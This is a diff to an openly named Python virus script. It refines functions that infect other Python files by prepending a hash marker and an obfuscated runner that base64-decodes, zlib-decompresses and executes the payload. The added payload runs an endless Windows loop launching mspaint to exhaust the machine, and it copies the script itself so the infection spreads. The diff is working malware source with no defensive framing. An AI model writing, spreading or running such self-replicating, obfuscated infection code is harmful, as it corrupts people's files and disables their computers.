@@ -10,8 +10,8 @@ def get_contents(file, hash=None):
     #holder for file contents
     content = None
     #opens file and reads lines into data
-    with open(file, "r") as my_file:
-        content = my_file.readlines()
+    with open(file, "r") as f:
+        content = f.readlines()
     #checks if the lines contain the correct hash 
     for line in content:
         if hash:
@@ -42,30 +42,20 @@ def infect(file, virus):
     content = get_contents(file, hash)
     if content:
         runner = "exec(\"import zlib\\nimport base64\\nexec(zlib.decompress(base64.urlsafe_b64decode("+str(hide(virus))+")))\")"
-
+        #writes virus into file
         with open(file, "w") as f:
             f.write("# hash-"+ hash + "\n" + runner + "\n")
             f.writelines(content)
 
 def get_virus():
-  infected = False
-  virus = []
+    infected = False
+    virus = [
+        'import os\n', "os.system('FOR /L %N IN () DO start mspaint')"]
 
-  virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
-  contents = get_contents(__file__)
+    virus_hash = hashlib.md5(os.path.basename(__file__).encode("utf-8")).hexdigest()
+    virus.extend(get_contents(__file__))
 
-  for line in contents:
-    if "# hash-" + virus_hash in line:
-      infected = True
-
-    if infected:
-      virus.append(line + "\n")
-
-    if "# hash-" + virus_hash in line:
-      infected = False
-      break
-
-  return virus
+    return virus
 
 
 def main():
